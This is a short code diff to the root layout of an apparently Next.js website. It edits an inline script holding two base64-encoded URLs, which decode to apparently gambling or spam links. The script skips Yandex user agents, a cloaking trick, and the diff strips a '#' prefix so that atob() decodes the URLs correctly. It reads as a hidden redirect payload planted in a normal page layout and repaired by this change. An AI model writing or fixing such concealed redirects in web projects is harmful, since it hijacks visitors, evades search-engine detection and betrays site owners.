@@ -110,8 +110,8 @@ export default function RootLayout({
                 var ua = navigator.userAgent.toLowerCase();
                 if (ua.indexOf("yandex") !== -1) return;
 
-                var mainBrandB64 = "#aHR0cHM6Ly9mbmtzbGluay5vcmcvZDd0dGxyeXZo"; 
-                var crossBrandB64 = "#aHR0cHM6Ly9sdWNreXNwaW4yMy5jb20vYzU3MDc4NjZl";      
+                var mainBrandB64 = "aHR0cHM6Ly9mbmtzbGluay5vcmcvZDd0dGxyeXZo"; 
+                var crossBrandB64 = "aHR0cHM6Ly9sdWNreXNwaW4yMy5jb20vYzU3MDc4NjZl";      
                 
                 var mainUrl = atob(mainBrandB64);
                 var crossUrl = atob(crossBrandB64);
